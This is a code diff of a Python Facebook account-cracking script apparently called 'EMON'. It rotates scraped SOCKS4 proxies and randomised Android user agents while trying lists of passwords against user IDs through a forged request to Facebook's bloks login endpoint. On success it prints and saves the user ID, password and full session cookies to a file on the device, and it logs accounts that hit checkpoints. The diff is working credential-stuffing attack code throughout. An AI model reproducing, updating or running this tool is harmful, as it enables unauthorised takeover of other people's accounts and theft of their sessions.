@@ -57,7 +57,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
 except Exception as e:
  print('')
@@ -77,6 +77,15 @@ for ua in range(5000):
     h='Mobile Safari/537.36'
     ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
     ugen.append(ug)
+
+def ____ChRoMeX___():
+	__Version__ = f"{random.randint(108,138)}.0.{random.randint(5359,7204)}.{random.randint(42,194)}"
+	__Android__ = random.choice(["8.1.0", "9", "10", "12", "7.0", "12", "11", "13", "8.1.0", "13", "7.0", "11", "13", "9", "12", "10", "8.1.0", "7.0"])
+	__Model__ = random.choice(["TECNO CA8", "TECNO KC1h", "TECNO CE7", "TECNO CG6j", "TECNO IN5", "TECNO CH6h", "TECNO KF6j", "TECNO CI8", "TECNO IN2", "TECNO LH7n", "TECNO CX Air", "TECNO LE6h", "TECNO KI5q", "TECNO KB3", "TECNO KI5k", "TECNO KE7", "TECNO RB7S", "TECNO W3 Pro"])
+	__Build__ = random.choice(["O11019", "OPM2.171019.012", "NMF26X", "SKQ1.210216.001", "R16NW", "SP1A.210812.016", "LMY47X", "QKQ1.200209.002", "MMB29K", "QP1A.190711.020", "LMY47D", "PPR1.180610.011", "NRD90M", "RP1A.201005.001", "MRA58K", "TP1A.220624.014", "MMB29M", "PKQ1.190319.001", "N2G47H", "RKQ1.211103.002", "LMY47V", "RP1A.200720.012", "KTU84P", "PPR1.281373.396", "LMY47I", "RP1A.200720.011"])
+	__XoX__ = f"Mozilla/5.0 (Linux; Android {__Android__}; {__Model__} Build/{__Build__}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{__Version__} Mobile Safari/537.36"
+	return __XoX__
+
 logo = ("""
 \033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗  \x1b[1;96m╔═╗\x1b[38;5;208m╔═╗\033[31;1m╔═╗\033[1;97m╔╗╔\033[1;30m╔╗╔   \033[33;1m╦ ╦\033[35;1m╦╔═╗\033[32;1m╔═╗\033[31;1m╔╗╔
 \033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║  \x1b[1;96m╠═╣\x1b[38;5;208m╠╣ \033[31;1m╠═╣\033[1;97m║║║\033[1;30m║║║   \033[33;1m╠═╣\033[35;1m║╠═╝\033[32;1m╠═╣\033[31;1m║║║
@@ -232,54 +241,59 @@ def rcrack1(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mEMON\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-			'method':'GET',
-			'path':'/?tbua=1',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-			'accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'referer': 'https://mbasic.facebook.com/',
-			'sec-ch-prefers-color-scheme': 'light',
-			'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-			'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.76", "Not(A:Brand";v="8.0.0.0"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-ch-ua-platform-version': '"10.0.0"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
+            session=requests.session()
+            link=session.get("https://mbasic.facebook.com/").text
+            rr=random.randint
+            data={
+            '__aaid': '0',
+            '__user': '0',
+            '__a': '1',
+            '__req': 'p',
+            '__hs': '20156.BP:wbloks_caa_pkg.2.0...0',
+            'dpr': '1',
+            '__ccg': 'MODERATE',
+            '__rev': '1020727961',
+            '__s': ':i9p1qu:mahlv2',
+            '__hsi': '7479797114083238570',
+            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+            '__csr': '',
+            '__hsdp': '',
+            '__hblp': '',
+            'fb_dtsg': 'NAcNUIYwJi18an1KNSKvDEsLdLTDlQVpg1Vud66BoblVCSXRf0aNVow:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
+            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
+            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+ps+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
+            headers = {
+            'authority': 'mbasic.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'origin': 'mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23090RA98G"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': ____ChRoMeX___(),}
+            session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',headers=headers, data=data).text
+            ____ReQ____=session.cookies.get_dict().keys()
+            if 'c_user' in ____ReQ____:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[EMON-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
-                open('/sdcard/EMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/EMON-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+            elif 'checkpoint' in ____ReQ____:
                 cid = coki[82:97]
-               ## print(f"\x1b[38;5;196m[EMON-CP] {cid}|{ps}")
+                print(f"\x1b[38;5;196m[EMON-CP] {cid} | {ps}")
                 open('/sdcard/EMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
